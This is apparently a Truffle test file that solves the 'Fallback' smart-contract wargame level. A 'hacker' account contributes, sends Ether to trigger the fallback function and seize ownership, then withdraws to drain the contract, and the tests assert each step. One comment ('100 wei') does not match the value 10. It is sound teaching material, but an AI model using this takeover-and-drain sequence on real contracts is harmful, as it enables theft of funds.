const { expect } = require('chai')
import { toEther, toWei, EVM_REVERT } from '../helpers'
const Fallback = artifacts.require("Fallback")

contract("Fallback", ([owner, hacker]) => {
    let fallback
    let contribution
    let deposit
    
    
    describe('Ownership', async () => {
        beforeEach(async () => {
            fallback = await Fallback.deployed()
            contribution = toEther(await fallback.getContribution())     
        })

        // contract owner confirmation
        it('confirms contract owner', async () => {
            assert.equal(await fallback.owner().valueOf(), owner)      
        })
        // owner contribution is deployed at by constructor
        it('confirms contract contribution', async () => {
            let balance = toEther(await fallback.getContribution({ from: owner }))
            assert.equal(balance.toString(),contribution.toString())
            
            balance = await fallback.getContribution({from: hacker }); 
            assert.equal(balance.toString(), '0')
        })
    })

    describe('Depositing a contribution', async () => {
        beforeEach(async () => {
            fallback = await Fallback.deployed()
            
         })
         // Non-owner makes a deposit, confirm contribution balance
         it('allows a non-owner to make a contribution', async () => {
             deposit = 10 // 100 wei
             await fallback.contribute({ from: hacker, value: deposit  })
             let balance = toEther(await fallback.getContribution({from: hacker }))
             assert.equal(balance.toString(), toEther(deposit).toString())
        })
        // Non owner calls the fallback function and takes ownership of the contract
         it('Non owner sends Ether to the contract, confirms new owner', async () => {
            await web3.eth.sendTransaction({from: hacker, to: fallback.address, value: web3.utils.toWei('0.001', 'ether')})
            assert.equal(await fallback.owner(), hacker)
        })

        it('drains funds from contract', async () => {
            let hackerBalance = await web3.eth.getBalance(hacker)
            await fallback.withdraw({ from: hacker })
            let newHackerBalance = await web3.eth.getBalance(hacker)
            let contractBalance = await fallback.getBalance()
            assert.equal(contractBalance.valueOf(), 0)
            assert.notEqual(contractBalance,newHackerBalance)      
        })

    })

   
})


